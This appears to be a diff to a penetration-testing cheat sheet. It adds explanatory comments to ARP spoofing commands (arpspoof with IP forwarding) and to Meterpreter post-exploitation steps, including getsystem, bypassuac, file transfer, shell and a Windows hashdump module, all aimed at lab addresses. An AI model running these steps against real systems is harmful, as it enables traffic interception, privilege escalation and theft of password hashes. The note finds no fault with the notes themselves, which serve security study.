@@ -186,10 +186,13 @@ smbclient //10.10.10.10/share -N (mount share)
 enum4linux -a 10.10.10.10
 ```
 
-### ARP spoofing
+### ARP spoofing \(Dsniff\)
 
-```text
+```bash
+# tells my machine to forward packets incepted to the real desination hosts
 echo 1 > /proc/sys/net/ipv4/ip_forward
+
+# arpspoof -i <interface> -t <target> -r <host>
 arpspoof -i tap0 -t 10.10.10.10 -r 10.10.10.11
 ```
 
@@ -212,12 +215,24 @@ sessions -i 1
 sysinfo
 ifconfig
 route
+
+# get which user is running process
 getuid
+
+# privilege escalation ('User Account Control' GPO policy may prevent this)
 getsystem
+
+# bypass the restriction of 'User Account Control' GPO policy to privesc
 bypassuac
+
+# transfering files
 download x /root/
 upload x C:\\Windows
+
+# run standard operating system shell
 shell
+
+
 use post/windows/gather/hashdump
 ```
 
